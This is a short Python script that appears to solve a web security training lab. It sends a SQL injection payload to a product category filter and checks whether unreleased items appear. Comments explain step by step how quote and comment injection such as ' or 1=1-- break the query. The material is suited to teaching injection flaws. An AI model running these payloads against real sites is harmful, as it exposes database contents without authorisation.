import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def is_exploitable(url, payload):
    proxies = {
    'http': 'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'}
    uri = '/filter?category='
    request = requests.get(
        url + uri + payload,
        verify=False,
        proxies=proxies)
    return "Cat Grin" in request.text

def get_url_payload():
    url =sys.argv[1].strip()
    payload = sys.argv[2].strip()
    return url, payload

if __name__ == "__main__":
    try:
        url, payload = get_url_payload()
        if is_exploitable(url, payload):
            print("[+] SQL injection successful!")
        else:
            print("[-] SQL injection unsuccessful")
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0]) 
        sys.exit(-1)

#Notes

# SQL injection - product category filter
# SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
# Display all products both released and unreleased.

# Analysis:
# SELECT * FROM products WHERE category = 'Pets' AND released = 1

# ' Gives us an internal error, it becomes the second '
# SELECT * FROM products WHERE category = ''' AND released = 1 

#'-- Gives us nothing back, ' becomes the second ' and the rest gets commented out
# SELECT * FROM products WHERE category = ''--' AND released = 1 
# SELECT * FROM products WHERE category = ''

#' or 1=1-- Performs injection, ' becomes the second ' or 1=1 and the rest gets commented out
# SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 